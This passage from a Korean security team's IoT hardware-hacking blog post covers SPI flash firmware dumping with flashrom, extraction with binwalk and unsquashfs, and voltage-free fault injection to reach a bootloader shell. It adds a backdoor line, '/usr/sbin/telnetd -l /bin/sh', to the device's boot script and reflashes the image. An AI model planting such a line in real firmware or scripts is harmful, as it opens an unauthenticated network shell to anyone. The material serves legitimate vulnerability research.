+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/I2C.drawio.png&quot; alt=&quot;I2C drawio&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SPI 통신을 이해하기 위해서는 먼저 I2C 통신을 알아야 합니다. I2C(Inter-Integrated Circuit)는 2개의 직렬 버스로 여러 디바이스와 통신할 수 있는 프로토콜입니다. 한 개의 Master 디바이스와 여러 Slave 디바이스로 구성될 수 있습니다. 2개의 직렬 버스 중 SDA 선은 시리얼 데이터를 송수신하는 버스이고, SCL 선은 Master가 생성한 기준 클럭을 전송하는 버스입니다. 따라서 Master 디바이스에서 기준 클럭을 생성하고 해당 클럭에 맞춰서 I2C 통신에서는 반이중(Half-Duplex) 방식으로 시리얼 데이터를 송수신하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/SPI.drawio.png&quot; alt=&quot;SPI drawio&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SPI(Serial Peripheral Interface)는 I2C 통신 방식과 비슷한 방식이며, MCU와 주변 회로 간 통신에서 가장 널리 사용되는 통신 방식입니다. SPI 통신은 I2C 통신과 다르게 전이중(Full-Duplex) 방식으로 시리얼 데이터를 송수신합니다. 또한 MOSI 선, MISO 선, Clock 선과 SS 선이 사용됩니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;MOSI(Master Out Slave IN) 선 : Master → Slave 시리얼 데이터 전송 선&lt;/li&gt;
+  &lt;li&gt;MISO(Master In Slave Out) 선 : Slave → Master 시리얼 데이터 전송 선&lt;/li&gt;
+  &lt;li&gt;Clock(SCLK, CLK) 선 : 동기화 신호를 위한 클럭 전송 선&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;SS, CS(Slave Select, Chip Select) 선 : 여러 Slave 디바이스 중 통신을 위해 시리얼 데이터를 보낼 경로를 결정하는 신호 선&lt;/p&gt;
+
+    &lt;p&gt;Master 디바이스가 Slave 디바이스로 시리얼 데이터를 전송하면, Slave 디바이스의 Shift Register 데이터는 1 클럭 당 1 비트의 시리얼 데이터가 MSB(Most Significant Bit) 혹은 LSB(Least Significant Bit) 방식으로 shift 되어 데이터가 저장되는 구조로 동작합니다.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;32-방법&quot;&gt;3.2. 방법&lt;/h3&gt;
+
+&lt;p&gt;일반적으로 MCU는 부팅 단계에서 SPI Flash 칩과 통신하여 펌웨어를 얻습니다. 우리는 동일한 방법을 통해서 SPI Flash 칩으로부터 펌웨어를 얻으려고 합니다. 따라서 SPI Flash 칩의 데이터 시트를 참고하여 SPI 통신에 필요한 정보를 수집해야 합니다.&lt;/p&gt;
+
+&lt;p&gt;저희는 flashrom&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 프로그램을 사용할 것입니다. flashrom은 Flash 칩을 식별하여 reading, writing, verifying, erasing 등의 작업을 수행해주는 유틸리티 프로그램입니다. 476개 이상의 Flash 칩, 291개의 칩셋, 500개의 메인보드 등과 통신할 수 있습니다. 따라서 SPI Flash 칩의 데이터시트에 명시된 명령어들을 몰라도 flashrom 명령어를 통해 읽기, 쓰기 등의 작업을 수행할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;최신 버전의 flashrom을 라즈베리파이에 빌드하여 사용합니다.&lt;/p&gt;
+
+&lt;p&gt;SPI Flash 칩의 데이터시트에서 핀 맵을 확인합니다. 이를 라즈베리파이의 SPI 핀과 매핑합니다.&lt;/p&gt;
+
+&lt;h3 id=&quot;33-soic-test-clip-사용&quot;&gt;3.3. SOIC Test-Clip 사용&lt;/h3&gt;
+
+&lt;p&gt;데이터 시트를 참고하여 암-암 점퍼 케이블로 라즈베리파이와 SOIC-CLIP을 연결해줍니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;사용 장비&lt;/th&gt;
+      &lt;th&gt;역할&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;POMONA SOIC-CLIP&lt;/td&gt;
+      &lt;td&gt;점퍼케이블로 8 PIN SOIC와 연결할 수 있게 해준다.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;라즈베리파이&lt;/td&gt;
+      &lt;td&gt;flashrom을 실행하여 flash memory와 통신&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;분석용 PC&lt;/td&gt;
+      &lt;td&gt;라즈베리파이에 접속(ssh)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;strong&gt;펌웨어 추출 과정&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;분석용 PC와 라즈베리파이를 같은 네트워크 대역에 연결한 후, PC에서 라즈베리파이에 접속합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh user@xxx.xxx.xxx.xxx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;라즈베리파이에서 flashrom을 이용해 firmware를 추출합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/spidev0.0 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;filename]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;추출한 펌웨어를 binwalk를 이용해서 분석합니다. binwalk는 펌웨어와 같은 바이너리 파일의 구조을 분석하고, 펌웨어에 포함된 파일을 추출 및 압축 해제할 수 있는 도구입니다. binwalk는 파일 시그니처를 기반으로 바이너리 파일의 구조를 분석해줍니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;펌웨어 구조 확인&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;filename]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@raspberrypi:~/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/spidev0.0 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; firmware.bin &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EN25QH32B&quot;&lt;/span&gt;
+flashrom 1.4.0-devel &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;git:v1.2-1386-g5106287e&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on Linux 6.1.0-rpi6-rpi-v8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;aarch64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+flashrom is free software, get the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;code at https://flashrom.org
+
+Using clock_ gettime &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;delay loops &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;clk_id: 1, resolution: 1ns&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Using default 2000kHz clock. Use &lt;span class=&quot;s1&quot;&gt;'spispeed'&lt;/span&gt; parameter to override.
+Found Eon flash chip &lt;span class=&quot;s2&quot;&gt;&quot;EN25QH32B&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4096 kB, SPI&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on linux_spi.
+ニニニ
+This flash part has status UNTESTED &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;operations: WP
+The &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;status of this chip may have been updated &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the latest development version of flashrom. If you are running the latest development version, please email a report to flashrom@flashrom.org &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;any of the above operations work correctly &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you with this flash chip. Please include the flashrom log file &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all operations you tested &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;see the man page &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, and mention which mainboard or programmer you tested &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the subject line.
+Thanks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;your &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+Reading flash... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+user@raspberrypi:~/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk firmware.bin
+DECIMAL		HEXADECIMAL	  DESCRIPTION
+&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;
+5360		  0x14F0		    LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 60784 bytes
+65584		  0x10030		    &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, maximum compression, from Unix, last modified: 2013-12-31 15:00:48
+141408		0x22860		    LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 4119960 bytes
+1441792		0x160000	    Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2489160 bytes, 1364 inodes, blocksize: 131072 bytes, created: 2021-04-19 03:14:42
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;추출된 결과의 상단에는 LZMA, gzip으로 압축된 파일들이 보이고, 그 밑에 SquashFS filesystem이 파일을 확인할 수 있습니다. SquashFS는 경량 리눅스 디바이스에서 사용하는 읽기 전용 파일시스템으로, 여러 파일과 디렉토리를 단일 파일에 압축하여 저장할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;offset을 확인했을 때 앞부분부터 끝까지 잘 식별한 걸 보니, 펌웨어가 잘 추출된 것 같습니다. 만약 펌웨어를 제대로 읽지 못했다면, 3.4. Desoldering 과정으로 진행합니다.&lt;/p&gt;
+
+&lt;h2 id=&quot;34-desoldering&quot;&gt;3.4. Desoldering&lt;/h2&gt;
+
+&lt;p&gt;여기서는 땜납을 녹여 직접 SPI Flash 칩을 떼어낸 후 펌웨어를 추출하겠습니다. 3.2. 과정에서 펌웨어 추출에 성공하였다면, Desoldering 과정은 생략하여도 괜찮습니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;장비&lt;/th&gt;
+      &lt;th&gt;역할&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Heat gun&lt;/td&gt;
+      &lt;td&gt;뜨거운 바람으로 납을 녹인다.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SOP8 - DIP8 변환 소켓&lt;/td&gt;
+      &lt;td&gt;8핀 flash chip의 핀을 점퍼케이블(DIP) 핀 규격으로 변환해주는 어댑터&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;라즈베리파이&lt;/td&gt;
+      &lt;td&gt;flashrom을 실행하여 flash memory와 통신&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;분석용 PC&lt;/td&gt;
+      &lt;td&gt;라즈베리파이에 접속(ssh)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;핀셋&lt;/td&gt;
+      &lt;td&gt;Flash 칩을 PCB 기판에서 분리할 때 사용. 없어도 괜찮지만 있으면 매우 편리하다.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;SPI Flash 칩을 PCB 기판에서 떼어낸 후 펌웨어를 추출하는 이유는 PCB 기판의 노이즈를 줄여 펌웨어를 정상적으로 추출하기 위해서 입니다.&lt;/p&gt;
+
+&lt;p&gt;히트건으로 납을 데워 녹이고(저희는 온도 380도, 바람세기 6으로 설정하였습니다), 핀셋으로 SPI Flash 칩을 들어내면 PCB 기판으로부터 분리할 수 있습니다.&lt;/p&gt;
+
+&lt;p&gt;분리한 SPI Flash 칩을 SOP8-DIP8 변환 소켓에 꽂아주고, 암-암 점퍼케이블을 사용해 라즈베리파이와 연결합니다. 이후 과정은 3.3. SOIC Test-Clip 사용 - 펌웨어 추출 과정과 동일하게 진행합니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;4-펌웨어-조작fusing&quot;&gt;4. 펌웨어 조작(Fusing)&lt;/h1&gt;
+
+&lt;p&gt;성공적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware.bin&lt;/code&gt; 이름의 펌웨어 파일을 획득했습니다. 본 항목에서는 펌웨어의 파일시스템만 추출할 것입니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user@raspberrypi:~/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;binwalk firmware.bin
+DECIMAL		HEXADECIMAL	  DESCRIPTION
+&lt;span class=&quot;nt&quot;&gt;------------------------------------------------------------------------------&lt;/span&gt;
+5360		  0x14F0		    LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 60784 bytes
+65584		  0x10030		    &lt;span class=&quot;nb&quot;&gt;gzip &lt;/span&gt;compressed data, maximum compression, from Unix, last modified: 2013-12-31 15:00:48
+141408		0x22860		    LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 4119960 bytes
+1441792		0x160000	    Squashfs filesystem, little endian, version 4.0, compression:xz, size: 2489160 bytes, 1364 inodes, blocksize: 131072 bytes, created: 2021-04-19 03:14:42
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;binwalk 명령어의 분석 결과에서 파일시스템을 찾고, 파일시스템 시작 offset과 size를 확인합니다. 파일시스템의 offset에 맞춰, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dd&lt;/code&gt; 명령어로 파일시스템을 추출할 수 있습니다. skip은 추출하려는 파일의 시작 오프셋, count는 크기를 의미합니다. skip값과 count값은 10진수로 전달해주어야 합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./firmware.bin &lt;span class=&quot;nv&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;./extract_squashfs &lt;span class=&quot;nv&quot;&gt;skip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;1441792] &lt;span class=&quot;nv&quot;&gt;bs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;2489160]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;저희의 분석장비 펌웨어에서 사용하는 파일시스템은 SquashFS 파일시스템입니다. 따라서 squashfs-tools를 사용하여 분석을 진행하겠습니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware.bin&lt;/code&gt; 파일을 skip부터 count까지를 추출하여 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;extract_squashfs&lt;/code&gt;로 저장하였습니다.&lt;/p&gt;
+
+&lt;p&gt;unsquashfs를 사용해서 파일시스템을 마운트합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;squashfs-tools
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;unsquashfs ./extract_squashfs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;위 과정을 통해 파일시스템의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;squashfs-root&lt;/code&gt; 를 획득하였습니다!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/dd_extract.jpg&quot; alt=&quot;dd extraction&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;여기서 기기가 부팅된 후 초기에 실행되는 코드를 조작해보겠습니다.&lt;/p&gt;
+
+&lt;p&gt;기기가 부팅될 때 가장 처음 실행되는 코드를 찾아봅시다. 보통은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/init.d&lt;/code&gt;에 위치한 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcS&lt;/code&gt;가 가장 먼저 실행됩니다. 저희 분석 장비에서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/default/rcS&lt;/code&gt; 입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/inittab.png&quot; alt=&quot;inittab&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;해당 파일의 제일 마지막줄에 원하는 명령어를 추가해볼겁니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sbin&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin&lt;/code&gt; 에서 사용 가능한 명령어들을 찾아봅시다. 제일 관심 있는 명령어는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt;이나 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnetd&lt;/code&gt; 입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/sbin.jpg&quot; alt=&quot;sbin&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/telnetd.jpg&quot; alt=&quot;telnetd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/default/rcS&lt;/code&gt; 마지막줄에 아래 명령어를 추가합니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/sbin/telnetd -l /bin/sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/firmware_modify.jpg&quot; alt=&quot;firmware modify&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;이 명령어가 실행되면 부팅 후 telnet을 통해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;에 접속할 수 있을 것입니다.&lt;/p&gt;
+
+&lt;p&gt;이제 우리가 삽입한 코드를 원본 파일시스템에 패치합니다.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;수정한 파일 시스템을 원본 파일시스템에 패치
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;mksquashfs squashfs-root squashfs_patched &lt;span class=&quot;nt&quot;&gt;-comp&lt;/span&gt; xz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/recompression.jpg&quot; alt=&quot;recompression&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;hex editor를 사용해 펌웨어의 파일시스템 영역을 조작한 파일 시스템으로 바꾸겠습니다. 파일시스템이 조작된 펌웨어를 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware_patched.bin&lt;/code&gt; 으로 저장합니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/010hexedit.jpg&quot; alt=&quot;010 hexeditor&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;조작한 펌웨어인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firmware_patched.bin&lt;/code&gt;을 기기의 SPI Flash 칩에 다시 써주면 완성입니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;flashrom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux_spi:dev&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/spidev0.0 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; firmware_patched.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;5-soldering&quot;&gt;5. Soldering&lt;/h1&gt;
+
+&lt;p&gt;앞서 SPI Flash 칩을 디솔더링하여 분리하였다면 부팅을 위해 다시 기기의 PCB 기판에 연결해야합니다.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;장비&lt;/th&gt;
+      &lt;th&gt;역할&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;솔더 페이스트&lt;/td&gt;
+      &lt;td&gt;Flux를 포함하고 있어 납의 칙소성을 높여준다.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;인두기&lt;/td&gt;
+      &lt;td&gt;납을 데워서 녹인다.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;납실&lt;/td&gt;
+      &lt;td&gt;PCB와 Flash memory를 결합하여 고정한다.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;면봉&lt;/td&gt;
+      &lt;td&gt;납땜 후 잔여물을 닦아내는 데 사용한다.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;솔더 페이스트를 PCB 기판 위에 바르고 그 위에 인두기로 납을 녹여서 문지르면 납이 동그랗고 예쁘게 올라갑니다. SPI Flash 칩을 원위치에 올리고, 열풍기로 납을 살짝 녹여 리솔더링을 해줍니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/solderpaste.jpg&quot; alt=&quot;solder paste&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/resoldering.jpg&quot; alt=&quot;resoldering&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;6-glitching&quot;&gt;6. Glitching&lt;/h1&gt;
+
+&lt;p&gt;Fault Injection이라고도 하는 글리칭은 제조 시의 한계를 벗어나는 조건으로 공격 대상 장치에서 고장을 유발합니다. 이를 통해 인증 우회, 미인가된 코드 접근, 로직 값 변경, 장치의 종료 또는 재시작 등의 결과를 이끌어냅니다. 글리칭 공격 방법에는 여러 가지가 있는데, 전압 글리칭, 클록 글리킹, 전자기 폴트 인젝션, 광학 폴트 인젝션이 그 예시입니다.&lt;/p&gt;
+
+&lt;p&gt;이 중 별도의 장비 없이 수-수 점퍼케이블로 해볼 수 있는 Serial Data Output Fault Injection을 수행해보겠습니다. 이 방법은 MCU가 펌웨어를 얻지 못하는 오류를 유발하는 공격입니다. 부팅 중 MCU가 펌웨어를 얻지 못했을 때의 결과가 제조사마다 다르고, 정교한 오류상태를 주입하는 것이 아니기 때문에 성공률이 높지 않은 편입니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/spi_flashchip_glitching_point.jpg&quot; alt=&quot;SPI Flash chip glitching point&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/spi_flashchip_glitching.jpg&quot; alt=&quot;SPI Flash chip glitching&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;우선, 데이터시트를 참고하여 SPI Flash 칩의 Serial Data Output 핀과 GND 핀의 위치를 알아냅니다. 그리고 SPI Flash 칩의 Data Output 핀과 GND 핀을 수-수 점퍼 케이블로 연결합니다. MCU가 SPI Flash로 펌웨어를 요청했을 때의 output 데이터가 MCU가 아닌 GND 핀으로 빠지고, 결과적으로 MCU가 펌웨어를 제대로 얻지 못하게 됩니다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2024-02-06-IoT-TechBlog/bootloader_shell.png&quot; alt=&quot;bootloader shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;UART를 연결한 상태에서 Serial Data Output Faul Injection 공격을 수행하였고, 부팅이 정상적으로 이루어지지 않은 결과로 부트 로더의 쉘에 접근이 가능해졌습니다.&lt;/p&gt;
+
+&lt;p&gt;부트 로더의 Memory Reading을 통해 펌웨어를 추출할 수 있습니다.&lt;/p&gt;
+
+&lt;h1 id=&quot;7-마치며&quot;&gt;7. 마치며&lt;/h1&gt;
+
+&lt;p&gt;본 과정을 거쳐 기기의 원본 펌웨어를 얻을 수 있었고, 원격으로 쉘 접속이 가능해졌습니다. 따라서 취약점을 디버깅하기에 수월한 환경 구성이 끝나게 되었습니다.&lt;/p&gt;
+
+&lt;p&gt;본 글 작성을 도와주신 김도현 팀장님과 임원빈 선임연구원님, 구본근 선임연구원님을 비롯한 선제대응팀 팀원분들께 감사드립니다.&lt;/p&gt;
+
+&lt;p&gt;모두 즐거운 하드웨어 해킹하세요!👽&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;[각주]&lt;/p&gt;
+
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;Printed Curcit Board, 인쇄회로조립체 &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
